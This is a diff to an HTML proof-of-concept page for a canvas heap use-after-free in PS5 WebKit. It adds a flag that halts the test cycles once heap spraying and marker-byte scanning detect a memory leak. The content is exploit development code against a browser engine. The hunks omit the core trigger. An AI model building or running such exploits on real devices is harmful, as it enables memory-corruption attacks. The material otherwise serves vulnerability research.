@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Canvas Heap UAF PoC Optimized</title>
+  <title>Canvas Heap UAF PoC - Auto Stop</title>
   <style>
     body { font-family: sans-serif; padding: 20px; }
     button { padding: 10px; font-size: 16px; }
@@ -11,7 +11,7 @@
 </head>
 <body>
 
-<h1>Canvas Heap UAF PoC (Optimized)</h1>
+<h1>Canvas Heap UAF PoC (Auto-Stop on Leak)</h1>
 <p>Target: PS5 WebKit | Safe Memory Disclosure Test</p>
 <button onclick="runCycles(10)">Run Safe Cycles</button>
 <div><strong>Status:</strong> <span id="status">Idle...</span></div>
@@ -28,6 +28,7 @@ const consoleDiv = document.getElementById('console');
 const memUsage = document.getElementById('memUsage');
 
 let approxMem = 0;
+let leakDetected = false;
 
 function log(msg) {
   consoleDiv.textContent += msg + '\n';
@@ -50,7 +51,7 @@ function fillImageData(imgData, value) {
 function stressGC() {
   const junk = [];
   for (let i = 0; i < 200; i++) {
-    junk.push(new ArrayBuffer(1024 * 512)); // 512 KB * 200 = ~100MB
+    junk.push(new ArrayBuffer(1024 * 512)); // ~100MB
     approxMem += 1024 * 512;
   }
   updateMemoryDisplay();
@@ -77,38 +78,42 @@ async function attemptMemoryDisclosure() {
 
   updateMemoryDisplay();
 
-  let leakDetected = false;
-
   for (let i = 0; i < leakers.length; i++) {
     const view = new Uint8Array(leakers[i]);
     for (let j = 0; j < view.length; j++) {
       if (view[j] === 0x41) {
         log(`Leak in buffer ${i}, byte ${j}`);
         leakDetected = true;
-        break;
+        return true;
       }
     }
-    if (leakDetected) break;
   }
 
-  if (!leakDetected) {
-    log('No leak detected in this attempt.');
-  } else {
-    log('*** Potential memory disclosure successful! ***');
-  }
+  log('No leak detected in this attempt.');
+  return false;
 }
 
 async function runCycles(cycles = 10) {
   approxMem = 0;
+  leakDetected = false;
   updateMemoryDisplay();
+
   for (let c = 0; c < cycles; c++) {
+    if (leakDetected) {
+      updateStatus('Leak detected! Halting further tests.');
+      log('*** Leak detected! Halting further tests. ***');
+      break;
+    }
     updateStatus(`Cycle ${c + 1} of ${cycles}`);
     log(`\n--- Cycle ${c + 1} ---`);
     await new Promise(resolve => setTimeout(resolve, 100));
     await attemptMemoryDisclosure();
     await new Promise(resolve => setTimeout(resolve, 100));
   }
-  updateStatus('Idle...');
+
+  if (!leakDetected) {
+    updateStatus('No leaks detected after all cycles.');
+  }
 }
 
 function isPS5() {
